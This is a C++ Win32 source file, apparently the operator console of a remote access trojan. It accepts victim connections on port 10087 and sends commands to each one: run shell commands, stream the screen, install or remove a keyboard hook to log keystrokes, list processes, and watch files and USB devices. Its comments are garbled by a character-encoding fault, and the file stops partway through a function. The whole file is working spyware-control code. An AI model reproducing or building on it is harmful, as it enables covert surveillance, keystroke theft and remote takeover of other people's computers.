
#include "resource.h"
#include <WinSock2.h>
#pragma comment(lib,"ws2_32.lib")

#include <commctrl.h>
#pragma comment( lib, "comctl32.lib" )

//�궨��

#define TYPE_RECV			101						//�հ�����


//cmd��
#define TO_CLIENT_CMD		10001
#define GET_CLIENT_CMD		10002

//��Ļ��
#define	TO_CLIENT_SCREEN	20001
#define GET_CLIENT_SCREEN	20002


//���̰�
#define TO_CLIENT_KEY		30001




//�Զ�����Ϣ
#define WM_OWN_SHOWCMD		0x0401					//��ʾCMD
#define WM_OWN_SHOWPROCESS	0x0402					//��ʾ������Ϣ
#define WM_OWN_KEY			0x0403					//��ʾ���̼�¼
#define WM_OWN_FILECONTROL	0x0404					//��ʾ�ļ����
#define WM_OWN_USB			0x0405					//��ʾUSB���
#define WM_OWN_SCREEN		0x0406					//��ʾ��Ļ


//���ṹ
#pragma pack(push)
#pragma pack(1)
struct MyWrap
{
	DWORD	dwType;			//��������
	DWORD	dwLength;		//�����ݵĳ���
	DWORD	dwOldLength;	//�Ѿ��ж�������
	PVOID	lpBuffer;		//������
};
#pragma pack(pop)



//������ʾ
struct _Show
{
	HWND	hWnd;
	DWORD 	dwItem;
};


//�ͻ��˽ṹ
struct ClientData
{
	MyWrap		stWrap;			//�ͻ��˵����ݰ�
	SOCKET		hSocketClient;	//������ָ���ͻ��˴������ݵ��׽��־��
	HANDLE		hThread;		//�������հ����߳̾��
	

	_Show		stShow;			//��ʾ���������̲߳���
	DWORD		dwHearTime;		//�������ʱ���

	HWND		hScreenWindow;	//��Ļ���ھ��

	HWND		hCmdWindow;		//Cmd���ھ��

	HWND		hKeyWindow;		//���̼�¼���ھ��

	HWND		hOtherWindow;	//�������ܴ��ھ��

	ClientData* Next;			//ָ����һ��ClientData�ṹ
};


ClientData* pHandClient = NULL;		//�ͻ�����������ͷָ��
HANDLE		 hmutex1;		//����ȫ�ֻ��������������ͬ���յ����͵��ͻ��˵İ���



HWND hWinMain;					//�����ھ��
SOCKET hSocketWait;				//���ڵȴ��ͻ������ӵ��׽��־��		
HANDLE hIocpData;				//����������ɶ˿ڶ�������Ϊ�˰�ȫ�˳��̳߳��е������̣߳�


struct MYOVERLAPPED
{
	WSAOVERLAPPED ol;			//ԭʼ�ص��ṹ
	DWORD nTypr;				//����
	BYTE* pBuf;					//���ݴ�ŵĻ�����
};








BOOL _stdcall _WorkThreadProc(HANDLE hIocp);



BOOL _stdcall _ShowUSB(HWND hWnd);
BOOL _stdcall _ShowFileControl(HWND hWnd);
BOOL _stdcall _ShowKey(HWND hWnd);
BOOL _stdcall _ShowProcess(HWND hWnd);
BOOL _stdcall _ShowCmd(HWND hWnd);
BOOL _stdcall _ShowScreen(HWND hWnd);


BOOL _stdcall _HeartTest();
BOOL _stdcall _CheckClient();
VOID _stdcall _InitSocket();
BOOL _stdcall _ToClient(_Show* lpScreen);
BOOL _stdcall _ReceiveClient();

BOOL CALLBACK _DialogOther(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam);
BOOL CALLBACK _DialogCmd(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam);
BOOL CALLBACK _DialogScreen(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam);
BOOL CALLBACK _DialogKey(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam);
BOOL CALLBACK _DialogMain(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam);
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR pCmdLine, int nCmdShow)
{

	MSG	stMsg;
	CreateDialogParam(hInstance, MAKEINTRESOURCE(IDD_DIALOG1), NULL, _DialogMain, 0);
	while (GetMessage(&stMsg, NULL, 0, 0))
	{

		TranslateMessage(&stMsg);
		DispatchMessage(&stMsg);
	}
	return stMsg.wParam;
}



//�����ڴ��ڹ���
BOOL CALLBACK _DialogMain(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	POINT		stPos;
	HICON		hIcon;
	static HMENU hMenu;
	static LVHITTESTINFO	lo;
	switch (message)
	{

	case WM_COMMAND:
		switch (LOWORD(wParam))
		{
		case ID_40001:				//��ʾ����
			DialogBoxParam(GetModuleHandle(NULL), MAKEINTRESOURCE(IDD_DIALOG2), NULL, _DialogScreen, lo.iItem);
			break;
		case ID_40002:				//��ʾ���̼�¼
			DialogBoxParam(GetModuleHandle(NULL), MAKEINTRESOURCE(IDD_DIALOG4), NULL, _DialogKey, lo.iItem);
			break;
		case ID_40003:				//��ʾcmd
			DialogBoxParam(GetModuleHandle(NULL), MAKEINTRESOURCE(IDD_DIALOG3), NULL, _DialogCmd, lo.iItem);
			break;
		case ID_40004:
			DialogBoxParam(GetModuleHandle(NULL), MAKEINTRESOURCE(IDD_DIALOG5), NULL, _DialogOther, lo.iItem);
			break;
		}
		break;
	case WM_NOTIFY:
		switch (((LPNMHDR)lParam)->code)
		{
		case NM_RCLICK:			//����Ŀ���һ�
			switch (((LPNMITEMACTIVATE)lParam)->hdr.idFrom)
			{
			case IDC_LIST1:
				GetCursorPos(&stPos);					//��������
				TrackPopupMenu(GetSubMenu(hMenu, 0), TPM_LEFTALIGN, stPos.x, stPos.y, NULL, hWnd, NULL);
				lo.pt.x = ((LPNMITEMACTIVATE)lParam)->ptAction.x;
				lo.pt.y = ((LPNMITEMACTIVATE)lParam)->ptAction.y;
				ListView_SubItemHitTest(GetDlgItem(hWnd, IDC_LIST1), &lo);
				break;
			}
			break;
		}
		break;
	case WM_CLOSE:
		PostMessage(hWnd, WM_DESTROY, 0, 0);
		break;
	case WM_DESTROY:

		if(hIocpData != NULL)
			PostQueuedCompletionStatus(hIocpData, 0, 0, 0);					//�˳��̳߳��е������߳�
		closesocket(hSocketWait);
		WSACleanup();
		PostQuitMessage(0);
		break;
	case WM_INITDIALOG:
		hWinMain = hWnd;

		hIcon = LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON1));
		SendMessage(hWnd, WM_SETICON, ICON_BIG, LPARAM(hIcon));

		hmutex1 = CreateMutex(NULL, false, NULL);//����������󲢷�������
		hMenu = LoadMenu(GetModuleHandle(NULL), MAKEINTRESOURCE(IDR_MENU1));
		_InitSocket();					//��ʼ������

		//�����߳�����ѭ�����տͻ�������
		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)_ReceiveClient, NULL, 0, NULL);
		//�����߳��������������
		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)_HeartTest, NULL, 0, NULL);

		break;

	default:
		return FALSE;
	}

	return TRUE;
}


//��������߳�
BOOL _stdcall _HeartTest()
{
	ClientData* pClient = pHandClient;		//����ָ��
	ClientData* pClientFront;		//����ָ��

	int i;
	while (1)
	{
		i = 0;
		pClient = pHandClient;
		while (pClient != NULL)
		{
			if (((GetTickCount() - pClient->dwHearTime) > 1000 * 60) && pClient->dwHearTime != 0)
			{
				if (pClient == pHandClient)
				{
					SendMessage(pClient->hScreenWindow, WM_CLOSE, 0, 0);								//�ر���Ļ��ʾ���ں��߳�
					SendMessage(pClient->hCmdWindow, WM_CLOSE, 0, 0);									//�ر�cmd����
					SendMessage(pClient->hKeyWindow, WM_CLOSE, 0, 0);									//�رռ��̴���
					ListView_DeleteItem(GetDlgItem(hWinMain, IDC_LIST1), 0);

					pHandClient = pHandClient->Next;
					delete pClient;
					pClient = pHandClient;
					continue;
				}
				else
				{
					SendMessage(pClient->hScreenWindow, WM_CLOSE, 0, 0);								//�ر���Ļ��ʾ���ں��߳�
					SendMessage(pClient->hCmdWindow, WM_CLOSE, 0, 0);									//�ر�cmd����
					SendMessage(pClient->hKeyWindow, WM_CLOSE, 0, 0);
					ListView_DeleteItem(GetDlgItem(hWinMain, IDC_LIST1), i);

					pClientFront->Next = pClient->Next;
					delete pClient;
					pClient = pClientFront->Next;
					continue;
				}
			}
			pClientFront = pClient;
			pClient = pClient->Next;
			i++;
		}

	}


}













//�����ʼ��
VOID _stdcall _InitSocket()
{
	//��ʼ��
	WORD	wVersionRequested;
	WSADATA	wsaData;
	wVersionRequested = MAKEWORD(2, 2);
	WSAStartup(wVersionRequested, &wsaData);


}



//���տͻ�������
BOOL _stdcall _ReceiveClient()
{
	char szIP[] = TEXT("IP��ַ");
	char szPort[] = TEXT("Port�˿�");
	LVCOLUMN lvColumn;			//������
	LVITEM lvItem;				//������
	memset(&lvItem, 0, sizeof(lvItem));
	memset(&lvColumn, 0, sizeof(lvColumn));


	ListView_SetExtendedListViewStyle(GetDlgItem(hWinMain, IDC_LIST1), LVS_EX_FULLROWSELECT);

	lvColumn.mask = LVCF_TEXT | LVCF_WIDTH;
	lvColumn.cx = 200;
	lvColumn.pszText = szIP;
	ListView_InsertColumn(GetDlgItem(hWinMain, IDC_LIST1), 0, &lvColumn);

	lvColumn.cx = 80;
	lvColumn.pszText = szPort;
	ListView_InsertColumn(GetDlgItem(hWinMain, IDC_LIST1), 1, &lvColumn);


	//����IOCP���ں˶���
	HANDLE hIocp = CreateIoCompletionPort(INVALID_HANDLE_VALUE, NULL, 0, 0);
	hIocpData = hIocp;

	//�����̳߳�
	SYSTEM_INFO mySysInfo;
	GetSystemInfo(&mySysInfo);				//��õ��Դ������ĺ�������
	for (int i = 0; i < mySysInfo.dwNumberOfProcessors; i++)		//���ڴ������ĺ������������߳�����
	{
		HANDLE hThreads = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)_WorkThreadProc, hIocp, 0, NULL);
		CloseHandle(hThreads);
	}




	//�����׽���
	hSocketWait = socket(
		AF_INET,
		SOCK_STREAM,
		0);




	//�󶨺ͼ����˿�
	sockaddr_in addr;				//��������ip�Ͷ˿ڵĽṹ��
	addr.sin_family = AF_INET;
	addr.sin_addr.S_un.S_addr = inet_addr("0.0.0.0");
	addr.sin_port = htons(10087);	//�˶˿���������˭�����ӷ����	
	bind(hSocketWait, (sockaddr*)&addr, sizeof(sockaddr_in));

	listen(hSocketWait, 5);			//����


	//��������
	sockaddr_in remoteAddr;
	int nLen = sizeof(remoteAddr);

	ClientData* pClient = pHandClient;		//����ָ��
	_Show lpScreen;						//�̲߳���
	TCHAR szBuffer[256];
	int i;
	while (1)
	{

		//�ȴ��ͻ�������
		memset(&remoteAddr, 0, sizeof(remoteAddr));
		remoteAddr.sin_family = AF_INET;
		SOCKET h = accept(hSocketWait, (sockaddr*)&remoteAddr, &nLen);				//�ȴ��ͻ�������

		if (h == -1)
			break;

		//��socket��I/O��ɶ˿ڰ�
		CreateIoCompletionPort(
			(HANDLE)h, 
			hIocp,
			h,				//��ɼ����ڴ�������л�ȡ�����ʱ�򣬱�־���ĸ�socket��
			mySysInfo.dwNumberOfProcessors);




		//����һ���ͻ������ݽṹ
		i = 1;												
		pClient = pHandClient;
		if (pHandClient == NULL)
		{
			pHandClient = new ClientData();
			pClient = pHandClient;
			pClient->Next = NULL;
			i = 0;
		}
		else
		{
			while (pClient->Next != NULL)
			{
				pClient = pClient->Next;
				i++;
			}

			pClient->Next = new ClientData();
			pClient = pClient->Next;
			pClient->Next = NULL;
		}
		pClient->hSocketClient = h;
		pClient->stWrap.lpBuffer = NULL;
		lpScreen.dwItem = i;
		pClient->dwHearTime = GetTickCount();	//��ʼ��ʱ���
		
		



		DWORD	dwSize;
		DWORD	dwFlag = 0;
		WSABUF	stBuffer;
		stBuffer.buf = new char[0x1000]();
		stBuffer.len = 0x1000;


		MYOVERLAPPED* lpMyOVERLAPPED = new MYOVERLAPPED;
		memset(lpMyOVERLAPPED, 0, sizeof(MYOVERLAPPED));
		lpMyOVERLAPPED->nTypr = TYPE_RECV;				//��ʾ����һ���հ���������
		lpMyOVERLAPPED->pBuf  =	(BYTE *)stBuffer.buf;			//ʹ���յ�������ͨ���ص��ṹ����


		//�첽������Ϣ�����������Ͷ��һ����������
		WSARecv(
			h,
			&stBuffer,						//�������ṹ
			1,								//��������������
			&dwSize,
			&dwFlag,
			&(lpMyOVERLAPPED->ol),			//��׼�ص��ṹ
			NULL);




		//UI����
		memset(&lvItem, 0, sizeof(lvItem));
		lvItem.mask = LVIF_TEXT;
		lvItem.iItem = i;
		ListView_InsertItem(GetDlgItem(hWinMain, IDC_LIST1), &lvItem);

		wsprintf(szBuffer, TEXT("%s"), inet_ntoa(remoteAddr.sin_addr));
		lvItem.iSubItem = 0;
		lvItem.pszText = szBuffer;
		ListView_SetItem(GetDlgItem(hWinMain, IDC_LIST1), &lvItem);

		wsprintf(szBuffer, TEXT("%d"), ntohs(remoteAddr.sin_port));
		lvItem.iSubItem = 1;
		lvItem.pszText = szBuffer;
		ListView_SetItem(GetDlgItem(hWinMain, IDC_LIST1), &lvItem);
	}



	return 0;
}





//�̳߳��̻߳ص������߳�
BOOL _stdcall _WorkThreadProc(HANDLE hIocp)
{
	DWORD dwByteNum;		//���յ����ֽ���
	DWORD dwIocpKey;		//Iocp��ɼ�
	MYOVERLAPPED* pMyOVERLAPPED;		//���ǵ��ص��ṹ

	MyWrap	stSendWrap;			//�����
	ClientData* pClient = pHandClient;		//����ָ��
	

	
	while (TRUE)
	{

		GetQueuedCompletionStatus(			//�����������ȡ����
			hIocp,
			&dwByteNum,
			&dwIocpKey,
			(LPOVERLAPPED*)&pMyOVERLAPPED,
			INFINITE);						//�����������������ʱ���أ�����һֱ�ȴ�

		
		if (dwIocpKey == 0)					//PostQueuedCompletionStatus������ɼ�Ϊ0����ʾ�˳�����
			break;
		if (pMyOVERLAPPED->nTypr == TYPE_RECV)		//�հ�����
		{


			
			pClient = pHandClient;
			while(pClient != NULL)
			{
				if (pClient->hSocketClient == dwIocpKey)
					break;
				pClient = pClient->Next;
			}

	
			if (pClient->stWrap.dwLength == 0)		//���հ�ͷ
			{
				
				pClient->stWrap.dwType = pMyOVERLAPPED->pBuf[0] + pMyOVERLAPPED->pBuf[1] * 0x100 + pMyOVERLAPPED->pBuf[2] * 0x10000 + pMyOVERLAPPED->pBuf[3] * 0x1000000;
				if (40001 == pClient->stWrap.dwType)
					MessageBeep(0);

				pClient->stWrap.dwLength = pMyOVERLAPPED->pBuf[4] + pMyOVERLAPPED->pBuf[5] * 0x100 + pMyOVERLAPPED->pBuf[6] * 0x10000 + pMyOVERLAPPED->pBuf[7] * 0x1000000;
				pClient->stWrap.dwOldLength = 0;
				pClient->stWrap.lpBuffer = new BYTE[pClient->stWrap.dwLength + 1]();


				
			}
			else									//���հ�β
			{

				if (dwByteNum + pClient->stWrap.dwOldLength > pClient->stWrap.dwLength)
					dwByteNum = pClient->stWrap.dwLength - pClient->stWrap.dwOldLength;
				memcpy(((BYTE*)pClient->stWrap.lpBuffer + pClient->stWrap.dwOldLength), pMyOVERLAPPED->pBuf, dwByteNum);
				pClient->stWrap.dwOldLength = pClient->stWrap.dwOldLength + dwByteNum;		//���������ֽ���


				if (pClient->stWrap.dwOldLength == pClient->stWrap.dwLength)				//�����ֽ����������ֽ�������ζ�Ž������ˣ�
				{

					switch (pClient->stWrap.dwType)						//���������Ϣ
					{
					case TO_CLIENT_CMD:
						SendMessage(pClient->hCmdWindow, WM_OWN_SHOWCMD, 0, 0);
						break;
					case TO_CLIENT_SCREEN:				//��Ļ��
						SendMessage(pClient->hScreenWindow, WM_OWN_SCREEN, 0, 0);
						break;
					case TO_CLIENT_KEY:					//���̼�¼��
						SendMessage(pClient->hKeyWindow, WM_OWN_KEY, 0, 0);
						break;
					case 40001:							//������Ϣ��
						SendMessage(pClient->hCmdWindow, WM_OWN_SHOWPROCESS, 0, 0);
						break;
					case 50001:							//�ļ���ذ�
						SendMessage(pClient->hKeyWindow, WM_OWN_FILECONTROL, 0, 0);
						break;
					case 60001:							//USB��ذ�
						SendMessage(pClient->hKeyWindow, WM_OWN_USB, 0, 0);
						break;
					case 90001:							//������
						stSendWrap.dwType = 90002;										//�ظ���������
						stSendWrap.dwLength = 0;
						WaitForSingleObject(hmutex1, INFINITE);		//���󻥳����1
						send(pClient->hSocketClient, (char*)&stSendWrap, 8, 0);
						ReleaseMutex(hmutex1);						//�ͷŻ������1
						break;
					}

					pClient->stWrap.dwLength = 0;
					pClient->dwHearTime = GetTickCount();		//��������ʱ���
					delete[] pClient->stWrap.lpBuffer;			//�ͷ��ڴ�


				}

			}

		}
		
		
		
		delete[] pMyOVERLAPPED->pBuf;					//�ͷ��ڴ�ռ�	
		
		DWORD	dwSize;
		DWORD	dwFlag = 0;
		WSABUF	stBuffer;
		if (pClient->stWrap.dwLength == 0)				//����������β����������һ�����İ�ͷ
		{
			stBuffer.buf = new char[8]();
			stBuffer.len = 8;
		}
		else											//����������ͷ�����ն�Ӧ��С�İ�β
		{
			stBuffer.buf = new char[pClient->stWrap.dwLength]();
			stBuffer.len = pClient->stWrap.dwLength;
		}

		memset(pMyOVERLAPPED, 0, sizeof(MYOVERLAPPED));
		pMyOVERLAPPED->nTypr = TYPE_RECV;				//��ʾ����һ���հ���������
		pMyOVERLAPPED->pBuf = (BYTE*)stBuffer.buf;		//ʹ���յ�������ͨ���ص��ṹ����

		//�첽������Ϣ�����������Ͷ��һ����������
		WSARecv(pClient->hSocketClient, &stBuffer, 1, &dwSize, &dwFlag, &(pMyOVERLAPPED->ol), NULL);
		
	}

	return 0;
}








//��ʾ��Ļ����(���ڻص�)
BOOL CALLBACK _DialogScreen(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{

	ClientData* pClient = pHandClient;		//����ָ��
	MyWrap	stSendWrap;						//�����
	switch (message)
	{
	case WM_OWN_SCREEN:						//��Ļ��
		_ShowScreen(hWnd);
		break;
	case WM_CLOSE:										
		EndDialog(hWnd, 0);
		break;
	case WM_INITDIALOG:
		for (int i = 0;i < lParam; i++)		//�����Ӧ��Ļ������Ϣ
			pClient = pClient->Next;

		pClient->stShow.hWnd = hWnd;
		pClient->stShow.dwItem = lParam;
		pClient->hScreenWindow = hWnd;

		
		
		stSendWrap.dwType = GET_CLIENT_SCREEN;			//������Ļ��Ϣ
		stSendWrap.dwLength = 0;
		WaitForSingleObject(hmutex1, INFINITE);		//���󻥳����1
		send(pClient->hSocketClient, (char*)&stSendWrap, 8, 0);
		ReleaseMutex(hmutex1);						//�ͷŻ������1
		break;
	default:
		return FALSE;
	}
	return TRUE;
}




//cmd���ڣ����ڻص���
BOOL CALLBACK _DialogCmd(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{

	char szPID[] = TEXT("PID");
	char szExeName[] = TEXT("���̿�ִ���ļ���");
	LVCOLUMN lvColumn;			//������
	memset(&lvColumn, 0, sizeof(lvColumn));

	ClientData* pClient = pHandClient;		//����ָ��
	MyWrap	stSendWrap;			//�����
	char	szBuffer[256];

	switch (message)
	{
	case WM_COMMAND:
		switch (LOWORD(wParam))
		{
		case IDC_BUTTON1:					//ִ��cmd����
			pClient = pHandClient;
			while (pClient != NULL)
			{
				if (pClient->hCmdWindow == hWnd)
				{
					GetDlgItemText(hWnd, IDC_EDIT2, szBuffer, sizeof(szBuffer));

					stSendWrap.dwType = GET_CLIENT_CMD;
					stSendWrap.dwLength = lstrlen(szBuffer);
					WaitForSingleObject(hmutex1, INFINITE);		//���󻥳����1
					send(pClient->hSocketClient, (char*)&stSendWrap, 8, 0);				//����ִ��cmd
					send(pClient->hSocketClient, szBuffer, stSendWrap.dwLength, 0);
					ReleaseMutex(hmutex1);						//�ͷŻ������1

				}
				pClient = pClient->Next;
			}
			break;

		case IDC_BUTTON2:					//��ý�����Ϣ
			pClient = pHandClient;
			while (pClient != NULL)
			{
				if (pClient->hCmdWindow == hWnd)
				{
					stSendWrap.dwType = 40002;
					stSendWrap.dwLength = 0;
					WaitForSingleObject(hmutex1, INFINITE);		//���󻥳����1
					send(pClient->hSocketClient, (char*)&stSendWrap, 8, 0);				//���������Ϣ
					ReleaseMutex(hmutex1);						//�ͷŻ������1

				}
				pClient = pClient->Next;
			}

			break;
		}
		break;

	case WM_OWN_SHOWCMD:
		_ShowCmd(hWnd);
		break;
	case WM_OWN_SHOWPROCESS:
		_ShowProcess(hWnd);
		break;
	case WM_CLOSE:
		EndDialog(hWnd, 0);
		break;
	case WM_INITDIALOG:
		for (int i = 0;i < lParam; i++)		//�����Ӧcmd������Ϣ
			pClient = pClient->Next;
		pClient->stShow.hWnd = hWnd;
		pClient->stShow.dwItem = lParam;
		pClient->hCmdWindow = hWnd;



		//��ʼ��������ʾ�б�
		ListView_SetExtendedListViewStyle(GetDlgItem(pClient->hCmdWindow, IDC_LIST1), LVS_EX_FULLROWSELECT);

		lvColumn.mask = LVCF_TEXT | LVCF_WIDTH;
		lvColumn.cx = 200;
		lvColumn.pszText = szExeName;
		ListView_InsertColumn(GetDlgItem(pClient->hCmdWindow, IDC_LIST1), 0, &lvColumn);

		lvColumn.mask = LVCF_TEXT | LVCF_WIDTH;
		lvColumn.cx = 120;
		lvColumn.pszText = szPID;
		ListView_InsertColumn(GetDlgItem(pClient->hCmdWindow, IDC_LIST1), 1, &lvColumn);


		break;
	default:
		return FALSE;
	}
	return TRUE;

}



//��ʾ���̼�¼����(���ڻص�)
BOOL CALLBACK _DialogKey(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{

	char szBuffer[0x256];
	MyWrap	stSendWrap;
	ClientData* pClient = pHandClient;		//����ָ��

	switch (message)
	{
	case WM_OWN_KEY:
		_ShowKey(hWnd);
		break;
	case WM_OWN_FILECONTROL:
		_ShowFileControl(hWnd);
		break;
	case WM_OWN_USB:
		_ShowUSB(hWnd);
		break;
	case WM_COMMAND:
		switch (LOWORD(wParam))
		{
		case IDC_BUTTON1:					//�ļ�Ŀ¼���
			pClient = pHandClient;
			while (pClient != NULL)
			{
				if (pClient->hKeyWindow == hWnd)
				{
					GetDlgItemText(hWnd, IDC_EDIT4, szBuffer, sizeof(szBuffer));

					stSendWrap.dwType = 50002;
					stSendWrap.dwLength = lstrlen(szBuffer);
					WaitForSingleObject(hmutex1, INFINITE);		//���󻥳����1
					send(pClient->hSocketClient, (char*)&stSendWrap, 8, 0);				//����ִ��cmd
					send(pClient->hSocketClient, szBuffer, stSendWrap.dwLength, 0);
					ReleaseMutex(hmutex1);						//�ͷŻ������1

				}
				pClient = pClient->Next;
			}
			break;
		case IDC_BUTTON2:					//��װ���̹���
			pClient = pHandClient;
			while (pClient != NULL)
			{
				if (pClient->hKeyWindow == hWnd)
				{
					stSendWrap.dwType = 30002;
					stSendWrap.dwLength = 0;
					WaitForSingleObject(hmutex1, INFINITE);		//���󻥳����1
					send(pClient->hSocketClient, (char*)&stSendWrap, 8, 0);				//����װ���̹���
					ReleaseMutex(hmutex1);						//�ͷŻ������1

				}
				pClient = pClient->Next;
			}
			break;
		case IDC_BUTTON3:					//ж�ؼ��̹���
			pClient = pHandClient;
			while (pClient != NULL)
			{
				if (pClient->hKeyWindow == hWnd)
				{
					stSendWrap.dwType = 30003;
					stSendWrap.dwLength = 0;
					WaitForSingleObject(hmutex1, INFINITE);		//���󻥳����1
					send(pClient->hSocketClient, (char*)&stSendWrap, 8, 0);				//����ж�ؼ��̹���
					ReleaseMutex(hmutex1);						//�ͷŻ������1

				}
				pClient = pClient->Next;
			}
			break;
		}
		break;
	case WM_CLOSE:										//�ر���ʾ��Ļ�߳�
		EndDialog(hWnd, 0);
		break;
	case WM_INITDIALOG:
		for (int i = 0;i < lParam; i++)		//�����Ӧ��Ļ������Ϣ
			pClient = pClient->Next;

		pClient->stShow.hWnd = hWnd;
		pClient->stShow.dwItem = lParam;
		pClient->hKeyWindow = hWnd;
		break;
	default:
		return FALSE;
	}
	return TRUE;
}





//�������ܴ��ڹ���
BOOL CALLBACK _DialogOther(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	MyWrap	stSendWrap;
	ClientData* pClient = pHandClient;		//����ָ��
	switch (message)
	{
	case WM_COMMAND:
		switch (LOWORD(wParam))
		{
		case IDC_BUTTON1:
			stSendWrap.dwType = 70002;
			stSendWrap.dwLength = 0;

			WaitForSingleObject(hmutex1, INFINITE);		//���󻥳����1
			send(pClient->hSocketClient, (char*)&stSendWrap, 8, 0);				//����������ɾ��
			ReleaseMutex(hmutex1);						//�ͷŻ������1
			break;
		case IDC_BUTTON2:
			stSendWrap.dwType = 70001;
			stSendWrap.dwLength = 0;

			WaitForSingleObject(hmutex1, INFINITE);		//���󻥳����1
			send(pClient->hSocketClient, (char*)&stSendWrap, 8, 0);				//����������ɾ��
			ReleaseMutex(hmutex1);						//�ͷŻ������1
			break;
		case IDC_BUTTON3:
			stSendWrap.dwType = 80001;
			stSendWrap.dwLength = 0;

			WaitForSingleObject(hmutex1, INFINITE);		//���󻥳����1
			send(pClient->hSocketClient, (char*)&stSendWrap, 8, 0);				//��������������
			ReleaseMutex(hmutex1);						//�ͷŻ������1
			break;
		case IDC_BUTTON4:
			stSendWrap.dwType = 80002;
			stSendWrap.dwLength = 0;

			WaitForSingleObject(hmutex1, INFINITE);		//���󻥳����1
			send(pClient->hSocketClient, (char*)&stSendWrap, 8, 0);				//��������������
			ReleaseMutex(hmutex1);						//�ͷŻ������1
		
			break;

		}
		break;
	case WM_CLOSE:										//�ر���ʾ��Ļ�߳�
		EndDialog(hWnd, 0);
		break;
	case WM_INITDIALOG:
		for (int i = 0;i < lParam; i++)		//�����Ӧ��Ļ������Ϣ
			pClient = pClient->Next;

		pClient->stShow.hWnd = hWnd;
		pClient->stShow.dwItem = lParam;
		pClient->hKeyWindow = hWnd;
		break;
	default:
		return FALSE;

	}
	return TRUE;
}






//��ʾ��Ļ
BOOL _stdcall _ShowScreen(HWND hWnd)
{


	HDC		hDeskDc;			//�����DC���
	HDC		hMyDc;				//���ǵ�DC(��������DC)
	HBITMAP hMyBitMap;			//����λͼ(���������)
	DWORD		nWidth = 0;				//��������ؿ�
	DWORD		nHeight = 0;			//��������ظ�

	MyWrap	stSendWrap;
	ClientData* pClient = pHandClient;		//����ָ��
	while (pClient != NULL)
	{
		if (pClient->hScreenWindow == hWnd)
		{

			hDeskDc = GetDC(hWnd);
			hMyDc = CreateCompatibleDC(hDeskDc);									//�ڴ�DC����������DC��

			nWidth = ((DWORD*)pClient->stWrap.lpBuffer)[0];
			nHeight = ((DWORD*)pClient->stWrap.lpBuffer)[1];
			hMyBitMap = CreateCompatibleBitmap(hDeskDc, nWidth, nHeight);			//����һ����ָ��DC���ݵ�λͼ

			SelectObject(hMyDc, hMyBitMap);											//��λͼѡ��ѡ�����ǵ�DC
			SetBitmapBits(hMyBitMap, pClient->stWrap.dwLength, pClient->stWrap.lpBuffer);			//�����ݰ��е���Ļ���ݸ��Ƶ�ָ��λͼ��

			BitBlt(																	//���ڴ�DC��ֵ���Ƶ���ĻDC�У�ʵ���������ν��˫������ƣ�
				hDeskDc,
				0,				//x
				0,				//y
				nWidth,
				nHeight,
				hMyDc,
				0,
				0,
				SRCCOPY			//����ģʽ
			);
			break;
		}
		pClient = pClient->Next;
	}

	DeleteObject(hMyBitMap);
	ReleaseDC(hWnd, hDeskDc);
	DeleteDC(hMyDc);



	//�õ���Ļ��������������һ����Ļ��
	stSendWrap.dwType = GET_CLIENT_SCREEN;							
	stSendWrap.dwLength = 0;
	WaitForSingleObject(hmutex1, INFINITE);		//���󻥳����1
	send(pClient->hSocketClient, (char*)&stSendWrap, 8, 0);
	ReleaseMutex(hmutex1);						//�ͷŻ������1


	return 0;
}


//��ʾcmd��Ϣ
BOOL _stdcall _ShowCmd(HWND hWnd)
{
	ClientData* pClient = pHandClient;		//����ָ��
	while (pClient != NULL)
	{
		if (pClient->hCmdWindow == hWnd)
		{

			SendMessage(GetDlgItem(pClient->hCmdWindow, IDC_EDIT1), EM_SETSEL, -2, -1);					//׷��дcmd����
			SendMessage(GetDlgItem(pClient->hCmdWindow, IDC_EDIT1), EM_REPLACESEL, true, (DWORD)pClient->stWrap.lpBuffer);
			break;
		}
		pClient = pClient->Next;
	}
	return 0;
}



//��ʾ������Ϣ
BOOL _stdcall _ShowProcess(HWND hWnd)
{
	DWORD  x;
	DWORD  i;
	DWORD  dwPid;
	char	szBuffer[256];
	LVITEM lvItem;				//������

	memset(&lvItem, 0, sizeof(lvItem));
	ClientData* pClient = pHandClient;		//����ָ��
	while (pClient != NULL)
	{
		if (pClient->hCmdWindow == hWnd)
		{
			ListView_DeleteAllItems(GetDlgItem(pClient->hCmdWindow, IDC_LIST1));
			x = 0;
			i = 0;
			while (((BYTE*)pClient->stWrap.lpBuffer + x)[0] == 0 && ((BYTE*)pClient->stWrap.lpBuffer + x)[1] != 0)
			{
				memset(&lvItem, 0, sizeof(lvItem));
				lvItem.mask = LVIF_TEXT;
				lvItem.iItem = i;
				ListView_InsertItem(GetDlgItem(pClient->hCmdWindow, IDC_LIST1), &lvItem);

				x++;
				lstrcpy(szBuffer, (LPCSTR)(((BYTE*)pClient->stWrap.lpBuffer) + x));
				lvItem.iSubItem = 0;
				lvItem.pszText = szBuffer;
				ListView_SetItem(GetDlgItem(pClient->hCmdWindow, IDC_LIST1), &lvItem);


				x = x + lstrlen((LPCSTR)((((BYTE*)pClient->stWrap.lpBuffer)) + x));
				x++;
				dwPid = *((DWORD*)(((BYTE*)pClient->stWrap.lpBuffer) + x));

				wsprintf(szBuffer, TEXT("%d"), dwPid);
				lvItem.iSubItem = 1;
				lvItem.pszText = szBuffer;
				ListView_SetItem(GetDlgItem(pClient->hCmdWindow, IDC_LIST1), &lvItem);


				x = x + 4;
				i++;

			}


			break;
		}
		pClient = pClient->Next;
	}
	return 0;

}


//���̼�¼��ʾ
BOOL _stdcall _ShowKey(HWND hWnd)
{
	ClientData* pClient = pHandClient;		//����ָ��
	while (pClient != NULL)
	{
		if (pClient->hKeyWindow == hWnd)
		{
			SendMessage(GetDlgItem(pClient->hKeyWindow, IDC_EDIT1), EM_SETSEL, -2, -1);					//���д���̼�¼����
